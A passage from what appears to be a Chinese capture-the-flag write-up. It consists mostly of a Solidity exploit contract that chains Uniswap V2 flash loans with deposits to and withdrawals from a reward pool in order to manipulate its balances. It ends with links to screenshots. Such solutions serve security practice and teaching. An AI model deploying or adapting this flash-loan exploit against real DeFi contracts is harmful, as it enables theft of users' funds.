 _price = _amount1.div(_amount0).div(2).mul(1e18);
 return _price;
}
contract Exp is IUniswapV2Callee{

 check public c;
 AppleRewardPool public pool; // IERCLike
 address public token0;
 address public token1;
 address public token2;
 address public token3;

 address public pair1;
 address public pair2;


 constructor(address _check, address _pool, address _token0, address _token1, address _token2, address _token3, address _pair1, address _pair2) public {
 c = check(_check);
 pool = AppleRewardPool(_pool);
 token0 = _token0;
 token1 = _token1;
 token2 = _token2;
 token3 = _token3;
 pair1 = _pair1;
 pair2 = _pair2;
 IERCLike(token0).approve(address(pool), 100000 ether);
 IERCLike(token1).approve(address(pool), 100000 ether);
 IERCLike(token2).approve(address(pool), 100000 ether);
 IERCLike(token3).approve(address(pool), 100000 ether);

 IERCLike(token1).approve(address(pair1), 100000 ether);

 }

 function flashloan() public {
 IUniswapV2Pair(pair1).swap(0, 10000 * 10 ** 18 - 1 , address(this), new bytes(10));
 }

 function flashloan2() public {
 IUniswapV2Pair(pair2).swap(0, 5000 * 10 ** 18 , address(this), new bytes(5));
 }


 function swap() public {
 IERCLike(token2).transfer(address(pair2), 9999 ether);
 IUniswapV2Pair(pair1).swap(0, 4999 * 10 ** 18 , address(this), new bytes(0));
 }

 function deposit(uint256 _pool, uint256 _amount) public {

 pool.deposit(_pool, _amount);
 }

 function withdraw(uint256 _pool, uint256 _amount) public {

 pool.withdraw(_pool, _amount);
 }

 function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
 if (data.length > 8) {
 require(IERCLike(token1).balanceOf(pair1) == 1, "err flash");

 pool.deposit(0, 1);

 require(IERCLike(token2).balanceOf(address(this)) >= 9999 * 10 ** 18, "err flash1");

 pool.withdraw(0, 1);

 IERCLike(token2).transfer(address(pair2), 10000 * 10 ** 18);
 IUniswapV2Pair(pair2).swap(5000 * 10 ** 18, 0, address(this), new bytes(0)); // got 4999 ether token1
 require(IERCLike(token1).balanceOf(pair2) < 10000 ether, "err flash2");

 require(IERCLike(token1).balanceOf(address(this)) >= 9999 ether, "err flash3");

 IERCLike(token1).transfer(address(pair1), 10000 * 10 ** 18 - 1);
 } else {
 pool.deposit(1, 5000 * 10 ** 18);
 IERCLike(token1).transfer(address(pair2), IERCLike(token1).balanceOf(address(this)));

 }


 }

 function transfer2(address to, uint256 amount) public {
 IERCLike(token2).transfer(to, amount);
 }

 function transfer3(address to, uint256 amount) public {
 IERCLike(token3).transfer(to, amount);
 }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/8-1680422876.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/9-1680422877.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/04/6-1680422877.jpeg)